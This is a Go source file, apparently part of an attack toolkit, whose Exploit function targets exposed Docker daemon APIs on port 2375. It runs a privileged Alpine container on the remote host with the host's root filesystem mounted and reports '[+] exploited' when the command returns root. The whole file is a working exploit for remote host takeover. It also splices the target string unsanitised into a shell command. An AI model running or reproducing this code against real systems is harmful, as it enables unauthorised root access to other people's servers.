package docker

import (
	"fmt"
	"os/exec"
	"strings"
)

func Exploit(target string) {
	removeProto := strings.Replace(target, "http://", "", -1)
	removeProto = strings.Replace(removeProto, "https://", "", -1)
	removeProto = strings.Replace(removeProto, "www.", "", -1)
	removeProto = strings.Replace(removeProto, "/version", "", -1)
	removeProto = strings.Replace(removeProto, ":2375", "", -1)

	command := fmt.Sprintf("docker -H %s:2375 run --rm -it --privileged --net=host -v /:/mnt alpine /bin/sh -c 'id'", removeProto)
	output, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		fmt.Printf("Error executing command: %v\n", err)
		return
	}

	if strings.Contains(string(output), "root") {
		msg := fmt.Sprintf("[+] exploited -> %s | %s", removeProto, string(output))
		fmt.Println(msg)
	} else {
		msg := fmt.Sprintf("[-] failed -> %s | you can make sure by manual", removeProto)
		fmt.Println(msg)
	}
}